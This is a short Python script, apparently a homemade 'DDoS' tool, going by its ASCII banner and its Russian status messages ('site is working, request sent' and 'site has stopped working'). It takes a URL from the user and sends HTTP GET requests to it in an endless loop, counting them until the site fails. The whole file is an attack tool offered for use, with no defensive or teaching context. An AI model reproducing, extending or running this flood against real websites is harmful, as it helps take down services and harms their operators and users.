import requests
import os
s = 0
def cls():
  os.system('cls' if os.name=='nt' else 'clear')
cls()
GREEN='\033[32m' 
MAGENTA='\033[35m'
banner = '''
 /$$$$$$$  /$$$$$$$             /$$$$$$ [New version]
| $$__  $$| $$__  $$           /$$__  $$
| $$  \ $$| $$  \ $$  /$$$$$$ | $$  \__/
| $$  | $$| $$  | $$ /$$__  $$|  $$$$$$ 
| $$  | $$| $$  | $$| $$  \ $$ \____  $$
| $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
| $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
|_______/ |_______/  \______/  \______/
By Pulatov Kamran 2021
'''
print(GREEN + banner)
url = input(MAGENTA+'Enter url: ')
while True:
    res = requests.get(url)
    if res.status_code == 200:
        s = s + 1
        print(GREEN+'Сайт работает, запрос отправлен [' + str(s) + ']')
    else:
        print('[info]Сайт перестал работать')
